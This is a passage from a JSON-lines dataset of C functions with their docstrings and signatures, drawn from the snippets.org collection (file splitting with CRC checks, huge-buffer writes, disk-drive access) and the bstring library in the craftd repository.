before expected \\\"End part\\\" separator line:\");\n            puts (line);\n            return PROCESS;\n          }\n          sptr += strlen (SEP_BP);\n\n          if (2 != sscanf (sptr, \"%d/%d\", &seppart, &sepmax))\n          {\n            printf (\"(line %d) \", lines);\n            puts (\"Unable to parse \\\"n/x\\\" from separator line:\");\n            puts (line);\n            return PROCESS;\n          }\n\n          if (0 == maxpart)\n            maxpart = sepmax;\n\n          if (curpart+1 != seppart)\n          {\n            printf (\"(line %d) \", lines);\n            printf (\"Encountered part %d while expecting part %d:\\n\", seppart, curpart+1);\n            puts (line);\n            return PROCESS;\n          }\n          in_section = B_TRUE;\n          ++curpart;\n        }\n        else if (sptr == strstr (sptr, SEP_EP))  /* if end part */\n        {\n          if (B_FALSE == in_section)\n          {\n            printf (\"(line %d) \", lines);\n            puts (\"Encountered 2nd \\\"End part\\\" separator line\");\n            puts (\"before expected \\\"Begin part\\\" separator line:\");\n            puts (line);\n            return PROCESS;\n          }\n          sptr += strlen (SEP_EP);\n          sptr = strstr (sptr, \": \");\n\n          if (1 != sscanf (sptr+2, \"%hx\", &sepcrc))   /* DN2: 32 bit fix */\n          {\n            printf (\"(line %d) \", lines);\n            puts (\"Corrupt CRC in separator line:\");\n            puts (line);\n            return PROCESS;\n          }\n\n          if (crc != sepcrc)\n          {\n            printf (\"(line %d) \", lines);\n            printf (\"Calculated CRC mismatch (0x%04x):\\n\", crc);\n            puts (line);           /* KC: report CRC mismatch only */\n          }\n          crc = 0;\n          in_section = B_FALSE;\n\n          if (curpart == maxpart)                /* if finished */\n            break;\n        }\n        else\n        {\n          if (sptr != strstr (sptr, SEP_VR))     /* if not version */\n          {\n            printf (\"(line %d) \", lines);\n            puts (\"Unrecognized separator line:\");\n            puts (line);\n            return PROCESS;\n          }\n        }\n      }\n      else                        /* else process data line */\n      {\n        if (B_TRUE == in_section) /* save only file data */\n        {\n          len = strlen (line);\n          crc = updcrc (crc, (unsigned char *)line, len);\n\n          if (B_TRUE == pos_wrap) /* if possible line wrap in progress */\n          {\n            if (0 == strncmp (line, \"\\\\\\n\", 2))  /* if wrapped line */\n            {\n              strcpy (line, line2);\n              line[strlen (line) - 2] = 0;  /* remove wrap EOL */\n            }\n            else\n            {\n              strcat (line2, line);\n              strcpy (line, line2);\n            }\n            pos_wrap = B_FALSE;\n          }\n          else  if ('\\\\' == line[len - 2]) /* if possible wrapped line */\n          {\n            strcpy (line2, line);\n            pos_wrap = B_TRUE;\n          }\n\n          if ((B_FALSE == pos_wrap) &&\n              ((NULL == fout) || (EOF == fputs (line, fout))))\n          {\n            puts (\"Error writing output\\n\");\n            return FILEIO;\n          }\n        }\n      }\n    }\n  } /*end_while*/\n\n  /* TS: Test for incompete processing. */\n  if (B_TRUE == in_section)\n  {\n    printf (\"Error: end of input while processing section %d of %d\\n\", seppart, sepmax);\n    return PROCESS;\n  }\n\n  if (seppart != sepmax)\n  {\n    printf (\"Error: end of input after processing section %d of %d\\n\", seppart, sepmax);\n    return PROCESS;\n  }\n  return NOERR;\n}", "path": "csplit.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n * split_src - This function takes a linked list of input source\n *             files, concatenates the source and then splits it\n *             into sections of controlled size.\n */\n", "func_signal": "int split_src (SLST *filelist, char *outfname, int length, int width, int tabstop, char sepchar)", "code": "{\n  char           line[WIDMAX + 1];\n  char          *ext     = 0;\n  char           filename[MAXFSPEC + 1];\n  char           outfile[MAXFSPEC + 1];\n  char           sep_ln[32];\n  char          *sptr    = 0;\n  int            curpart = 0;\n  int            key     = 0;\n  int            lines   = 0;\n  int            maxpart = 1;\n  int            retc    = 0;\n  int            temp    = 0;\n  unsigned short crc     = 0;\n\n\n  strcpy (outfile, outfname);\n\n  if (NULL == (ext = strchr (outfile, '.')))     /* ignore any ext */\n    ext = &outfile[strlen (outfile)];\n\n  *ext = 0;                                      /* make temp file name */\n  strcpy (tempfile, outfile);\n  strcat (tempfile, \".CSP\");\n\n  if (NULL == (ftmp = fopen (tempfile, \"w\")))\n  {\n    printf (\"Error creating temp file:  %s\\n\", tempfile);\n    return FILEIO;\n  }\n\n  for (temp = 0; temp < 10; ++temp)\n    sep_ln[temp] = (char)sepchar;\n\n  sep_ln[temp] = '\\0';\n\n  for (cur = filelist, lines = 0; NULL != cur; cur = cur->next)\n  {\n    if (NULL == finp)\n    {\n      if (NULL == (finp = fopen (cur->srcfile, \"r\")))\n      {\n        printf (\"Error opening source file:  %s\\n\", cur->srcfile);\n        return FILEIO;\n      }\n\n      if ((NULL != (sptr = strrchr (cur->srcfile, '\\\\'))) ||\n          (NULL != (sptr = strrchr (cur->srcfile, ':')))) /* Darin McBride */\n        strcpy (filename, sptr+1);\n      else\n        strcpy (filename, cur->srcfile);\n\n      retc = fprintf (ftmp, \"%s %s%s%s %s\\n\", sep_ln, SEP_ID, SEP_BF, filename, sep_ln);\n\n      if (0 == retc)\n      {\n        puts (\"Error writing output\\n\");\n        return FILEIO;\n      }\n      ++lines;\n    }\n\n    while (NULL != finp)\n    {\n      /*\n       * The function csp_fgets() is equivalent to fgets() in that it\n       * too reads n-1 characters or up to a newline character.  This\n       * function additionally expands TAB characters, deletes trailing\n       * whitespace and wraps lines exceeding the specified length.\n       */\n      if (NULL == csp_fgets (line, width, finp, tabstop))\n      {\n        if (feof (finp))\n        {\n          fclose (finp);\n          finp = NULL;\n          retc = fprintf (ftmp, \"%s %s%s%s %s\\n\", sep_ln, SEP_ID, SEP_EF, filename, sep_ln);\n\n          if (0 == retc)\n          {\n            puts (\"Error writing output\\n\");\n            return FILEIO;\n          }\n          ++lines;      /* adjust line count */\n        }\n        else\n        {\n          puts (\"Error reading input\\n\");\n          return FILEIO;\n        }\n      }\n      else\n      {\n        if (EOF == fputs (line, ftmp))\n        {\n          puts (\"Error writing output\\n\");\n          return FILEIO;\n        }\n        ++lines;\n      }\n    } /*end_while*/\n  } /*end_for*/\n\n  if (0 != length)\n  {\n    /* There are 3 lines of overhead per section. */\n    maxpart = lines / (length - 3);\n\n    if ((lines % (length - 3)) > 0)\n      ++maxpart;                       /* for partial section */\n  }\n\n  curpart = 1;\n  sprintf (ext, \".%03d\", curpart);     /* make 1st output file name */\n\n  /* warn user if the output filename is already in use */\n  if (NULL != (fout = fopen (outfile, \"r\")))\n  {\n    key = 0;\n    printf (\"Output file already exists:  %s\\n\", outfile);\n\n    do\n    {\n      printf (\"Overwrite? (y/n): \");\n      key = (toupper) (getchar ());    /* prevent using toupper macro */\n      puts (\"\");\n      temp = key;\n\n      while (temp != '\\n')\n      {\n        temp = getchar ();             /* eat all extra keystrokes */\n      }\n\n      if ('N' == key)\n        return ABORT;\n\n    } while ('Y' != key);\n\n    fclose (fout);\n    fout = NULL;\n  }\n\n  if (NULL == freopen (tempfile, \"r\", ftmp))\n  {\n    printf (\"Error reopening temp file:  %s\\n\", tempfile);\n    return FILEIO;\n  }\n\n  initcrctab ();\n\n  while (NULL != ftmp)\n  {\n    lines = 0;\n\n    if (NULL == fout)\n    {\n      sprintf (ext, \".%03d\", curpart); /* make output file name */\n\n      if (NULL == (fout = fopen (outfile, \"w\")))\n      {\n        printf (\"Error opening output file:  %s\\n\", outfile);\n        return FILEIO;\n      }\n\n      retc = fprintf (fout, \"%s %s%s%s %s\\n\", sep_ln, SEP_ID, SEP_VR, VERSION, sep_ln);\n\n      if (0 == retc)\n      {\n        puts (\"Error writing output\\n\");\n        return FILEIO;\n      }\n\n      ++lines;\n      retc = fprintf (fout, \"%s %s%s%d/%d %s\\n\", sep_ln, SEP_ID, SEP_BP, curpart, maxpart, sep_ln);\n\n      if (0 == retc)\n      {\n        puts (\"Error writing output\\n\");\n        return FILEIO;\n      }\n\n      ++lines;\n    }\n\n    crc = 0;\n\n    while (((0 == length ) || (lines < (length - 1))) &&\n           (NULL != ftmp))\n    {\n      if (NULL == fgets (line, WIDMAX, ftmp))\n      {\n        if (feof (ftmp))\n        {\n          fclose (ftmp);\n          ftmp = NULL;\n        }\n        else\n        {\n          puts (\"Error reading input\\n\");\n          return FILEIO;\n        }\n      }\n      else\n      {\n        crc = updcrc (crc, (unsigned char *)line, strlen (line));\n\n        if (EOF == fputs (line, fout))\n        {\n          puts (\"Error writing output\\n\");\n          return FILEIO;\n        }\n\n        ++lines; /* increment line count */\n      }\n    } /*end_while*/\n\n    if (0 == fprintf (fout, \"%s %s%s%d/%d crc: %04x %s\\n\", sep_ln, SEP_ID, SEP_EP, curpart, maxpart, crc, sep_ln))\n    {\n      puts (\"Error writing output\\n\");\n      return FILEIO;\n    }\n\n    fclose (fout);\n    fout = NULL;\n    ++curpart;\n  } /*end_while*/\n\n  return NOERR;\n}", "path": "csplit.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n**  Get the largest buffer possible.\n*/\n", "func_signal": "static size_t gettmp(char **buf)", "code": "{\n      size_t bufsiz;\n\n      for (bufsiz = 0x4000; bufsiz >= 128; bufsiz >>= 1)\n      {\n            if (NULL != (*buf = (char *) malloc(bufsiz)))\n                  return bufsiz;\n      }\n      return 0;\n}", "path": "hugeread.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n**  Write any size block from anywhere in memory\n*/\n", "func_signal": "long hugewrite(int fh, unsigned char FAR *buf, long size)", "code": "{\n      long count;\n      size_t bufsiz;\n      char *tmp;\n      long ercode = size;\n\n      if (4 > sizeof(void *))\n      {\n            if (0 == (bufsiz = gettmp(&tmp)))\n                  return -1L;\n      }\n      else\n      {\n            tmp = (char *)buf;\n            bufsiz = 0x4000;\n      }\n\n      buf = farnormal(buf);\n      while (0 < (count = min(size, (long)bufsiz)))\n      {\n            int i, numwrite;\n\n            if (4 > sizeof(void *))\n            {\n                  for (i = 0; i < count; ++i)\n                        tmp[i] = buf[i];\n            }\n            numwrite = write(fh, tmp, (size_t)count);\n            if (1 > numwrite || numwrite != (int)count)\n                  return -1L;\n            buf = farnormal(buf + count);\n            size -= count;\n            if (2 < sizeof(void *))\n                  tmp = (char *)buf;\n      }\n      return ercode;\n}", "path": "hugeread.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n /=======================================\\\n|   MAIN\n|-------------------------------------|\n|\\=======================================/\n|\n| Looping through files matching the first argument\n|\n|\n|\n|\n| Virtual main()\n|\n| See template.c\n|\n|-KNOWN ERRORS AND FLAWS------------------------------------------------------|\n|\n|\n|\n|\n|-CORRECTIONS-----------------------------------------------------------------|\n|\n|\n|\n|\n|-----------------------------------------------------------------------------|\n|1995-06-19/Erik Bachmann\n\\===========================================================================|*/\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n      DOSFileData       ffblk;                        /* File control block */\n      int                     done;                   /* Done flag */\n\n      /*--------------------------------*/\n\n      fprintf(stderr, \"\\n%Fs v. %Fs : %s\\n\", PROGNAME, PROGVER,\n              stModulInfo.pszCopyright);\n      fprintf(stdout, \"Argument: %s\\n\", argv[1]);\n\n      if ('?' == argv[1][1])\n      {\n            fprintf(stderr, HELPFORMAT, argv[0]);\n            exit();\n      }\n      strcpy(szInputFile, argv[1]);\n\n      done = FIND_FIRST(szInputFile, 0, &ffblk);\n\n      /* Find first file */\n\n      while (!done)\n      {\n            search_file(ff_name(&ffblk));  /* Search file for tokens */\n            done = FIND_NEXT(&ffblk);      /* Find next matching file */\n      }\n\n      return(0);\n}", "path": "what.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n * free_list - This function simply frees each linked list item.\n */\n", "func_signal": "void free_list (void)", "code": "{\n  while (NULL != head)\n  {\n    cur = head->next;\n    free (head);\n    head = cur;\n  }\n}", "path": "csplit.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n * cleanup - Just a convenient way to provide centralized housekeeping.\n */\n", "func_signal": "void cleanup (void)", "code": "{\n  free_list ();\n\n  if (NULL != finp)  fclose (finp);\n  if (NULL != fout)  fclose (fout);\n  if (NULL != ftmp)  fclose (ftmp);\n\n  /* Now, does it really exist? */\n  if (NULL != (ftmp = fopen (tempfile, \"r\")))\n  {\n    fclose (ftmp);\n    remove (tempfile);\n  }\n}", "path": "csplit.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n * init_list - This function creates a linked list of input source\n *             files.  Wildcard specifications are accommodated when\n *             ANSI mode is not in effect.\n */\n", "func_signal": "int init_list (int argc, char **argv, int argo)", "code": "{\n  int i;\n#if !defined(__STDC__)\n  char         filename[MAXFSPEC + 1];\n  char         path[PATHMAX + 1];\n  char        *sptr;\n  int          done;\n  DOSFileData  fd;\n#endif\n\n  for (i = argo; i < argc; ++i)             /* process CL arguments */\n  {\n#if !defined(__STDC__)\n    if (strlen (argv[i]) > (MAXFSPEC - FNAMELEN))\n    {\n      printf (\"Input file argument too long:  %s\\n\", argv[i]);\n      return SYNTAX;\n    }\n\n    done = FIND_FIRST(argv[i], 0x20, &fd);  /* david nugent */\n\n    if (done)\n    {\n      printf (\"Error with filespec: %s\\n\", argv[i]);\n      return PROCESS;\n    }\n\n    strcpy (path, argv[i]);                 /* preserve path */\n\n    if (NULL != (sptr = strrchr (path, '\\\\')))\n      *(sptr + 1) = '\\0';\n    else\n      path[0] = '\\0';\n\n    while (!done)\n    {\n      if ('\\0' != path[0])\n      {\n        strcpy (filename, path);\n\n        if (NULL != (sptr = strrchr (ff_name(&fd), '\\\\')))\n          strcat (filename, sptr + 1);      /* just in case */\n        else\n          strcat (filename, ff_name(&fd));\n      }\n      else\n        strcpy (filename, ff_name(&fd));\n\n      if (NULL == add_list (filename))      /* david nugent */\n        return MEMORY;\n\n      done = FIND_NEXT(&fd);\n    }\n    FIND_END(&fd);                          /* david nugent */\n#else\n    if (strlen (argv[i]) > MAXFSPEC)\n    {\n      printf (\"Input file argument too long:  %s\\n\", argv[i]);\n      return SYNTAX;\n    }\n\n    if (NULL == add_list (argv[i]))\n      return MEMORY;\n\n#endif\n  }\n  return NOERR;\n}", "path": "csplit.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n** gain acces to drive (required if disk in drive is unformated)\n*/\n", "func_signal": "void    SetAccess(unsigned int drivenumber, APB FAR *apb)", "code": "{\n      apb->Function = 0;\n      DOS_IOCTL(drivenumber, GENERIC_GETACC, apb);\n      if(apb->Flag == 0)\n      {\n            apb->Flag = 1;\n            DOS_IOCTL(drivenumber, GENERIC_SETACC, apb);\n      }\n}", "path": "format.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*  char * bstr2cstr (const_bstring s, char z)\n *\n *  Create a '\\0' terminated char * buffer which is equal to the contents of \n *  the bstring s, except that any contained '\\0' characters are converted \n *  to the character in z. This returned value should be freed with a \n *  bcstrfree () call, by the calling application.\n */\n", "func_signal": "char * bstr2cstr (const_bstring b, char z)", "code": "{\nint i, l;\nchar * r;\n\n\tif (b == NULL || b->slen < 0 || b->data == NULL) return NULL;\n\tl = b->slen;\n\tr = (char *) bstr__alloc ((size_t) (l + 1));\n\tif (r == NULL) return r;\n\n\tfor (i=0; i < l; i ++) {\n\t\tr[i] = (char) ((b->data[i] == '\\0') ? z : (char) (b->data[i]));\n\t}\n\n\tr[l] = (unsigned char) '\\0';\n\n\treturn r;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  bstring bfromcstr (const char * str)\n *\n *  Create a bstring which contains the contents of the '\\0' terminated char *\n *  buffer str.\n */\n", "func_signal": "bstring bfromcstr (const char * str)", "code": "{\nbstring b;\nint i;\nsize_t j;\n\n\tif (str == NULL) return NULL;\n\tj = (strlen) (str);\n\ti = snapUpSize ((int) (j + (2 - (j != 0))));\n\tif (i <= (int) j) return NULL;\n\n\tb = (bstring) bstr__alloc (sizeof (struct tagbstring));\n\tif (NULL == b) return NULL;\n\tb->slen = (int) j;\n\tif (NULL == (b->data = (unsigned char *) bstr__alloc (b->mlen = i))) {\n\t\tbstr__free (b);\n\t\treturn NULL;\n\t}\n\n\tbstr__memcpy (b->data, str, j+1);\n\treturn b;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bassignformat (bstring b, const char * fmt, ...)\n *\n *  After the first parameter, it takes the same parameters as printf (), but \n *  rather than outputting results to stdio, it outputs the results to \n *  the bstring parameter b. Note that if there is an early generation of a \n *  '\\0' character, the bstring will be truncated to this end point.\n */\n", "func_signal": "int bassignformat (bstring b, const char * fmt, ...)", "code": "{\nva_list arglist;\nbstring buff;\nint n, r;\n\n\tif (b == NULL || fmt == NULL || b->data == NULL || b->mlen <= 0 \n\t || b->slen < 0 || b->slen > b->mlen) return BSTR_ERR;\n\n\t/* Since the length is not determinable beforehand, a search is\n\t   performed using the truncating \"vsnprintf\" call (to avoid buffer\n\t   overflows) on increasing potential sizes for the output result. */\n\n\tif ((n = (int) (2*strlen (fmt))) < START_VSNBUFF) n = START_VSNBUFF;\n\tif (NULL == (buff = bfromcstralloc (n + 2, \"\"))) {\n\t\tn = 1;\n\t\tif (NULL == (buff = bfromcstralloc (n + 2, \"\"))) return BSTR_ERR;\n\t}\n\n\tfor (;;) {\n\t\tva_start (arglist, fmt);\n\t\texvsnprintf (r, (char *) buff->data, n + 1, fmt, arglist);\n\t\tva_end (arglist);\n\n\t\tbuff->data[n] = (unsigned char) '\\0';\n\t\tbuff->slen = (int) (strlen) ((char *) buff->data);\n\n\t\tif (buff->slen < n) break;\n\n\t\tif (r > n) n = r; else n += n;\n\n\t\tif (BSTR_OK != balloc (buff, n + 2)) {\n\t\t\tbdestroy (buff);\n\t\t\treturn BSTR_ERR;\n\t\t}\n\t}\n\n\tr = bassign (b, buff);\n\tbdestroy (buff);\n\treturn r;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int btoupper (bstring b)\n *\n *  Convert contents of bstring to upper case.\n */\n", "func_signal": "int btoupper (bstring b)", "code": "{\nint i, len;\n\tif (b == NULL || b->data == NULL || b->mlen < b->slen ||\n\t    b->slen < 0 || b->mlen <= 0) return BSTR_ERR;\n\tfor (i=0, len = b->slen; i < len; i++) {\n\t\tb->data[i] = (unsigned char) upcase (b->data[i]);\n\t}\n\treturn BSTR_OK;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int binchrr (const_bstring b0, int pos, const_bstring b1);\n *\n *  Search for the last position in b0 no greater than pos, in which one of \n *  the characters in b1 is found and return it.  If such a position does not \n *  exist in b0, then BSTR_ERR is returned.\n */\n", "func_signal": "int binchrr (const_bstring b0, int pos, const_bstring b1)", "code": "{\nstruct charField chrs;\n\tif (pos < 0 || b0 == NULL || b0->data == NULL || b1 == NULL ||\n\t    b0->slen < pos) return BSTR_ERR;\n\tif (pos == b0->slen) pos--;\n\tif (1 == b1->slen) return bstrrchrp (b0, b1->data[0], pos);\n\tif (0 > buildCharField (&chrs, b1)) return BSTR_ERR;\n\treturn binchrrCF (b0->data, pos, &chrs);\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bsreadln (bstring r, struct bStream * s, char terminator)\n *\n *  Read a bstring terminated by the terminator character or the end of the\n *  stream from the bStream (s) and return it into the parameter r.  This \n *  function may read additional characters from the core stream that are not \n *  returned, but will be retained for subsequent read operations.\n */\n", "func_signal": "int bsreadln (bstring r, struct bStream * s, char terminator)", "code": "{\n\tif (s == NULL || s->buff == NULL || r == NULL || r->mlen <= 0)\n\t\treturn BSTR_ERR;\n\tif (BSTR_OK != balloc (s->buff, s->maxBuffSz + 1)) return BSTR_ERR;\n\tr->slen = 0;\n\treturn bsreadlna (r, s, terminator);\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*\n * int btrimws (bstring b)\n *\n * Delete whitespace contiguous from both ends of the string.\n */\n", "func_signal": "int btrimws (bstring b)", "code": "{\nint i, j;\n\n\tif (b == NULL || b->data == NULL || b->mlen < b->slen ||\n\t    b->slen < 0 || b->mlen <= 0) return BSTR_ERR;\n\n\tfor (i = b->slen - 1; i >= 0; i--) {\n\t\tif (!wspace (b->data[i])) {\n\t\t\tif (b->mlen > i) b->data[i+1] = (unsigned char) '\\0';\n\t\t\tb->slen = i + 1;\n\t\t\tfor (j = 0; wspace (b->data[j]); j++) {}\n\t\t\treturn bdelete (b, 0, j);\n\t\t}\n\t}\n\n\tb->data[0] = (unsigned char) '\\0';\n\tb->slen = 0;\n\treturn BSTR_OK;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bspeek (bstring r, const struct bStream * s)\n *\n *  Return the currently buffered characters from the bStream that will be \n *  read prior to reads from the core stream.\n */\n", "func_signal": "int bspeek (bstring r, const struct bStream * s)", "code": "{\n\tif (s == NULL || s->buff == NULL) return BSTR_ERR;\n\treturn bassign (r, s->buff);\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bisstemeqcaselessblk (const_bstring b0, const void * blk, int len)\n *\n *  Compare beginning of string b0 with a block of memory of length len \n *  without differentiating between case for equality.  If the beginning of b0\n *  differs from the memory block other than in case (or if b0 is too short), \n *  0 is returned, if the strings are the same, 1 is returned, if there is an \n *  error, -1 is returned.  '\\0' characters are not treated in any special \n *  way.\n */\n", "func_signal": "int bisstemeqcaselessblk (const_bstring b0, const void * blk, int len)", "code": "{\nint i;\n\n\tif (bdata (b0) == NULL || b0->slen < 0 || NULL == blk || len < 0)\n\t\treturn BSTR_ERR;\n\tif (b0->slen < len) return BSTR_OK;\n\tif (b0->data == (const unsigned char *) blk || len == 0) return 1;\n\n\tfor (i = 0; i < len; i ++) {\n\t\tif (b0->data[i] != ((const unsigned char *) blk)[i]) {\n\t\t\tif (downcase (b0->data[i]) != \n\t\t\t    downcase (((const unsigned char *) blk)[i])) return 0;\n\t\t}\n\t}\n\treturn 1;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  bstring bgets (bNgetc getcPtr, void * parm, char terminator)\n *\n *  Use an fgetc-like single character stream reading function (getcPtr) to \n *  obtain a sequence of characters which are concatenated into a bstring.  \n *  The stream read is terminated by the passed in terminator function.\n *\n *  If getcPtr returns with a negative number, or the terminator character \n *  (which is appended) is read, then the stream reading is halted and the \n *  result obtained thus far is returned.  If no characters are read, or \n *  there is some other detectable error, NULL is returned.\n */\n", "func_signal": "bstring bgets (bNgetc getcPtr, void * parm, char terminator)", "code": "{\nbstring buff;\n\n\tif (0 > bgetsa (buff = bfromcstr (\"\"), getcPtr, parm, terminator) || 0 >= buff->slen) {\n\t\tbdestroy (buff);\n\t\tbuff = NULL;\n\t}\n\treturn buff;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int btolower (bstring b)\n *\n *  Convert contents of bstring to lower case.\n */\n", "func_signal": "int btolower (bstring b)", "code": "{\nint i, len;\n\tif (b == NULL || b->data == NULL || b->mlen < b->slen ||\n\t    b->slen < 0 || b->mlen <= 0) return BSTR_ERR;\n\tfor (i=0, len = b->slen; i < len; i++) {\n\t\tb->data[i] = (unsigned char) downcase (b->data[i]);\n\t}\n\treturn BSTR_OK;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bcatcstr (bstring b, const char * s)\n *\n *  Concatenate a char * string to a bstring.\n */\n", "func_signal": "int bcatcstr (bstring b, const char * s)", "code": "{\nchar * d;\nint i, l;\n\n\tif (b == NULL || b->data == NULL || b->slen < 0 || b->mlen < b->slen\n\t || b->mlen <= 0 || s == NULL) return BSTR_ERR;\n\n\t/* Optimistically concatenate directly */\n\tl = b->mlen - b->slen;\n\td = (char *) &b->data[b->slen];\n\tfor (i=0; i < l; i++) {\n\t\tif ((*d++ = *s++) == '\\0') {\n\t\t\tb->slen += i;\n\t\t\treturn BSTR_OK;\n\t\t}\n\t}\n\tb->slen += i;\n\n\t/* Need to explicitely resize and concatenate tail */\n\treturn bcatblk (b, (const void *) s, (int) strlen (s));\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int binsert (bstring b1, int pos, bstring b2, unsigned char fill)\n *\n *  Inserts the string b2 into b1 at position pos.  If the position pos is \n *  past the end of b1, then the character \"fill\" is appended as necessary to \n *  make up the gap between the end of b1 and pos.  Unlike bsetstr, binsert\n *  does not allow b2 to be NULL.\n */\n", "func_signal": "int binsert (bstring b1, int pos, const_bstring b2, unsigned char fill)", "code": "{\nint d, l;\nptrdiff_t pd;\nbstring aux = (bstring) b2;\n\n\tif (pos < 0 || b1 == NULL || b2 == NULL || b1->slen < 0 || \n\t    b2->slen < 0 || b1->mlen < b1->slen || b1->mlen <= 0) return BSTR_ERR;\n\n\t/* Aliasing case */\n\tif ((pd = (ptrdiff_t) (b2->data - b1->data)) >= 0 && pd < (ptrdiff_t) b1->mlen) {\n\t\tif (NULL == (aux = bstrcpy (b2))) return BSTR_ERR;\n\t}\n\n\t/* Compute the two possible end pointers */\n\td = b1->slen + aux->slen;\n\tl = pos + aux->slen;\n\tif ((d|l) < 0) return BSTR_ERR;\n\n\tif (l > d) {\n\t\t/* Inserting past the end of the string */\n\t\tif (balloc (b1, l + 1) != BSTR_OK) {\n\t\t\tif (aux != b2) bdestroy (aux);\n\t\t\treturn BSTR_ERR;\n\t\t}\n\t\tbstr__memset (b1->data + b1->slen, (int) fill, (size_t) (pos - b1->slen));\n\t\tb1->slen = l;\n\t} else {\n\t\t/* Inserting in the middle of the string */\n\t\tif (balloc (b1, d + 1) != BSTR_OK) {\n\t\t\tif (aux != b2) bdestroy (aux);\n\t\t\treturn BSTR_ERR;\n\t\t}\n\t\tbBlockCopy (b1->data + l, b1->data + pos, d - l);\n\t\tb1->slen = d;\n\t}\n\tbBlockCopy (b1->data + pos, aux->data, aux->slen);\n\tb1->data[b1->slen] = (unsigned char) '\\0';\n\tif (aux != b2) bdestroy (aux);\n\treturn BSTR_OK;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  struct bStream * bsopen (bNread readPtr, void * parm)\n *\n *  Wrap a given open stream (described by a fread compatible function \n *  pointer and stream handle) into an open bStream suitable for the bstring \n *  library streaming functions.\n */\n", "func_signal": "struct bStream * bsopen (bNread readPtr, void * parm)", "code": "{\nstruct bStream * s;\n\n\tif (readPtr == NULL) return NULL;\n\ts = (struct bStream *) bstr__alloc (sizeof (struct bStream));\n\tif (s == NULL) return NULL;\n\ts->parm = parm;\n\ts->buff = bfromcstr (\"\");\n\ts->readFnPtr = readPtr;\n\ts->maxBuffSz = BS_BUFF_SZ;\n\ts->isEOF = 0;\n\treturn s;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
{"docstring": "/*  int bdelete (bstring b, int pos, int len)\n *\n *  Removes characters from pos to pos+len-1 inclusive and shifts the tail of \n *  the bstring starting from pos+len to pos.  len must be positive for this \n *  call to have any effect.  The section of the string described by (pos, \n *  len) is clamped to boundaries of the bstring b.\n */\n", "func_signal": "int bdelete (bstring b, int pos, int len)", "code": "{\n\t/* Clamp to left side of bstring */\n\tif (pos < 0) {\n\t\tlen += pos;\n\t\tpos = 0;\n\t}\n\n\tif (len < 0 || b == NULL || b->data == NULL || b->slen < 0 || \n\t    b->mlen < b->slen || b->mlen <= 0) \n\t\treturn BSTR_ERR;\n\tif (len > 0 && pos < b->slen) {\n\t\tif (pos + len >= b->slen) {\n\t\t\tb->slen = pos;\n\t\t} else {\n\t\t\tbBlockCopy ((char *) (b->data + pos),\n\t\t\t            (char *) (b->data + pos + len), \n\t\t\t            b->slen - (pos+len));\n\t\t\tb->slen -= len;\n\t\t}\n\t\tb->data[b->slen] = (unsigned char) '\\0';\n\t}\n\treturn BSTR_OK;\n}", "path": "third-party\\bstring\\bstrlib.c", "repo_name": "kev009/craftd", "stars": 76, "license": "other", "language": "c", "size": 1771}
